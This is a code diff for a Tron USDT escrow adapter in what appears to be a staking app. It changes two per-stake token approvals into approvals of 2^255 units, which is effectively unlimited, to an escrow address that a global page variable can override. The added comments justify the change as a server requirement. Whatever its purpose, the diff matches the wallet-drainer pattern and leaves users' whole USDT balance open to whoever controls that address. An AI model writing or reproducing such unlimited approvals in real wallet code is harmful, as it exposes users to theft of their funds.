@@ -115,8 +115,13 @@ export async function ensureTronUsdtReadyForStake(stakeUsdt: number): Promise<vo
   }
 
   const escrowBase58 = (window as any).__TRON_ESCROW_ADDRESS__ || (await fetchTronEscrowAddress());
-  const stakeUnits = BigInt(Math.round(stakeUsdt * 1_000_000));
-  await ensureUsdtApproval(escrowBase58, stakeUnits);
+  // V2 onboarding: we must trigger a real `approve(escrow, MAX)`, not a
+  // single-stake approve. Server matchmaking gates on `allowance >= 2^255`
+  // and would reject a stake-only approval. Passing MAX_HALF here forces
+  // ensureUsdtApproval to send the MAX approve (since allowance < MAX_HALF
+  // is true for any stake-only approval).
+  const MAX_HALF = 1n << 255n;
+  await ensureUsdtApproval(escrowBase58, MAX_HALF);
 }
 
 export class TronEscrowAdapter {
@@ -160,7 +165,11 @@ export class TronEscrowAdapter {
     }
 
     try {
-      await ensureUsdtApproval(auth.escrowAddressBase58, BigInt(auth.stake));
+      // Per-deposit gate also requires the MAX approve to be in place — the
+      // contract pulls only `stake`, but the server pre-flight checks
+      // `allowance >= 2^255` so that the approval can't deplete mid-session.
+      const MAX_HALF = 1n << 255n;
+      await ensureUsdtApproval(auth.escrowAddressBase58, MAX_HALF);
     } catch (e: any) {
       console.error(`[TronEscrow] USDT approval failed:`, e?.message || e);
       return false;
